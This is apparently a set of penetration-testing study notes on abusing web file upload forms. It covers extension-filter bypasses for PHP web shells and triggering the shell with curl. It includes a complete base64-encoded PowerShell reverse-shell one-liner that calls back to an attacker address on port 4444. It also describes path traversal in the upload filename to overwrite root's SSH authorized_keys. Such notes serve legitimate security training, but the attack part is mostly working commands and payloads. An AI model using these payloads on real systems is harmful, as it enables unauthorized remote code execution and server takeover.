
Do discover FUVs we must find obvious file upload vectors or make an educated guess at the location of upload mechanisms - e.g. CMS will provide uploads for profile avatars, create blog posts and web pages with attached files. A lawyers office may have an upload mechanism for case files. They are not always obvious so we must never skip enumeration.


### Using Executable Files

1. Test the file upload by attempting to upload files that were not specified or intended to be uploaded - if we get a successful upload of a text file for an image upload we may be able to utilize this for an executable file.
2. If our executable upload is rejected - e.g. `.php` file, we can try other extensions that are compatible like `.phar, .phps, .php7`, etc.
3. If alternate extensions do not work we can attempt to mess with the case of the extension - e.g. `.phar -> .phAR`.
4. `curl http://url/directory/uploads/backdoor.pHP?cmd=dir`- After successful upload we can utilize curl to trigger out backdoor.
5. for a windows target we can send a PowerShell one-liner base64 encoded using curl

```
pwsh

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

$EncodedText =[Convert]::ToBase64String($Bytes)

$EncodedText

exit
```

6. start Netcat
7. `curl http://target/directory/backdoor.pHP?cmd=powershell%20-enc%20BASE-64-PAYLOAD`

`Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like **.txt**, then changing the file back to the original file type of the web shell by renaming it.`


### Using Non-Executable Files

we may find unrestricted file upload vulnerabilities but we may not be able to execute said files.

In these situations we need to leverage other vulnerabilities like directory traversal to abuse the file upload mechanism.

`When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use`

If we find we can upload an unrestricted file type - we should check if we can upload the file to a directory outside of the web root or somewhere else unintended. This may enable us to overwrite files on the machine.

such as ssh keys.

1. `ssh-keygen` - create a new public private key pair
2. `cat key.pub > authorized_keys` - cat the contents of our new public key into a file called `authorized_keys ` which will match the name of the` authorized_keys` file in the `root/.ssh/` directory.
3. attempt to upload the file using burpsuite to intercept the POST request and edit the file name in the content description of the request to attempt to make use of directory traversal. `filename="authorized_keys"` to `filename="../../../../../../../../root/.ssh/authorized_keys"`.
4. `rm ~/.ssh/known_hosts` - may need to remove known_hosts file to prevent errors
5. `ssh -p <port> -i privatekey root@ip/url` - connect to the remote server with the newly overwritten key
